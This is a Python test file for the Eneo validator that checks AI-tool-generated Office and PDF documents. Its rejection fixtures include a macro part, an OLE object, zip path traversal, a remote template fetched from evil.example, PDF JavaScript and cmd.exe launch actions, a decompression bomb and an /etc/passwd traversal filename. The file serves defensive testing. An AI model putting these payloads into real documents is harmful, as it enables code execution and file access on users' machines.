"""Format checks a tool-generated document must pass before it becomes a File."""

import io
import zipfile

import pytest

from eneo.files.generated_documents import (
    GeneratedDocumentRejected,
    validate_generated_document,
)
from eneo.mcp_servers.domain.entities.mcp_server import (
    DOCX_MIME_TYPE,
    PDF_MIME_TYPE,
    XLSX_MIME_TYPE,
    generated_filename,
)

_CONTENT_TYPES = (
    b'<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
    b'package/2006/content-types"/>'
)


def _package(parts: dict[str, bytes], compression=zipfile.ZIP_DEFLATED) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", compression=compression) as archive:
        for name, data in parts.items():
            archive.writestr(name, data)
    return buffer.getvalue()


def _docx(**extra: bytes) -> bytes:
    return _package(
        {
            "[Content_Types].xml": _CONTENT_TYPES,
            "word/document.xml": b"<w:document/>",
            **extra,
        }
    )


def _rels(relationship: bytes) -> bytes:
    return b"<Relationships>" + relationship + b"</Relationships>"


class TestOfficeDocuments:
    def test_accepts_minimal_documents_and_hyperlinks(self):
        hyperlink = _rels(
            b'<Relationship Id="r1" Type="http://schemas.openxmlformats.org/'
            b'officeDocument/2006/relationships/hyperlink" '
            b'Target="https://eneo.ai" TargetMode="External"/>'
        )
        validate_generated_document(
            _docx(**{"word/_rels/document.xml.rels": hyperlink}), DOCX_MIME_TYPE
        )
        workbook = _package(
            {"[Content_Types].xml": _CONTENT_TYPES, "xl/workbook.xml": b"<workbook/>"}
        )
        validate_generated_document(workbook, XLSX_MIME_TYPE)

    @pytest.mark.parametrize(
        "data",
        [
            b"not a zip",
            # A workbook declared as a Word document.
            _package(
                {"[Content_Types].xml": _CONTENT_TYPES, "xl/workbook.xml": b"<w/>"}
            ),
            _docx(**{"word/vbaProject.bin": b"macro"}),
            _docx(**{"word/embeddings/oleObject1.bin": b"ole"}),
            _docx(**{"../evil.xml": b"x"}),
            _package(
                {
                    "[Content_Types].xml": _CONTENT_TYPES
                    + b"<!-- application/vnd.ms-word.document.macroEnabled -->",
                    "word/document.xml": b"<w:document/>",
                }
            ),
            # A template loaded from elsewhere when the file opens.
            _docx(
                **{
                    "word/_rels/settings.xml.rels": _rels(
                        b'<Relationship Id="r1" Type="http://schemas.openxmlformats.'
                        b'org/officeDocument/2006/relationships/attachedTemplate" '
                        b'Target="https://evil.example/t.dotm" TargetMode="External"/>'
                    )
                }
            ),
        ],
        ids=[
            "not-zip",
            "wrong-type",
            "macro",
            "ole-object",
            "path-traversal",
            "macro-content-type",
            "external-template",
        ],
    )
    def test_rejects_unsafe_or_mistyped_packages(self, data):
        with pytest.raises(GeneratedDocumentRejected):
            validate_generated_document(data, DOCX_MIME_TYPE)

    def test_rejects_decompression_bombs(self):
        bomb = _docx(**{"word/media/big.xml": b"0" * (8 * 1024 * 1024)})
        with pytest.raises(GeneratedDocumentRejected, match="size limit"):
            validate_generated_document(bomb, DOCX_MIME_TYPE)


class TestPdf:
    def test_accepts_a_plain_pdf(self):
        validate_generated_document(
            b"%PDF-1.7\n1 0 obj << /Type /Catalog >> endobj\n%%EOF\n", PDF_MIME_TYPE
        )

    @pytest.mark.parametrize(
        "data",
        [
            b"<html>not a pdf</html>",
            b"%PDF-1.7\ntruncated",
            b"%PDF-1.7\n<< /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>\n%%EOF",
            b"%PDF-1.7\n<< /S /Launch /F (cmd.exe) >>\n%%EOF",
            b"%PDF-1.7\n<< /Names << /EmbeddedFiles 2 0 R >> >>\n%%EOF",
        ],
        ids=["not-pdf", "truncated", "javascript", "launch", "embedded-file"],
    )
    def test_rejects_non_pdf_or_active_content(self, data):
        with pytest.raises(GeneratedDocumentRejected):
            validate_generated_document(data, PDF_MIME_TYPE)


def test_rejects_undeclared_types():
    with pytest.raises(GeneratedDocumentRejected):
        validate_generated_document(b"<html/>", "text/html")


@pytest.mark.parametrize(
    "uri,mime_type,expected",
    [
        (
            "eneo-tool-runtime://documents/1/Kvartalsrapport.docx",
            DOCX_MIME_TYPE,
            "Kvartalsrapport.docx",
        ),
        ("x://a/Budget%202026.xlsx", XLSX_MIME_TYPE, "Budget 2026.xlsx"),
        # The declared type wins over the name's extension.
        ("x://a/report.exe", PDF_MIME_TYPE, "report.pdf"),
        ("x://a/..%2F..%2Fetc%2Fpasswd", PDF_MIME_TYPE, "_.._etc_passwd.pdf"),
        ("x://a/.hidden", DOCX_MIME_TYPE, "hidden.docx"),
        ("x://a/...", DOCX_MIME_TYPE, "document.docx"),
        (None, XLSX_MIME_TYPE, "document.xlsx"),
    ],
)
def test_generated_filename_is_safe_and_typed(uri, mime_type, expected):
    assert generated_filename(uri, mime_type) == expected
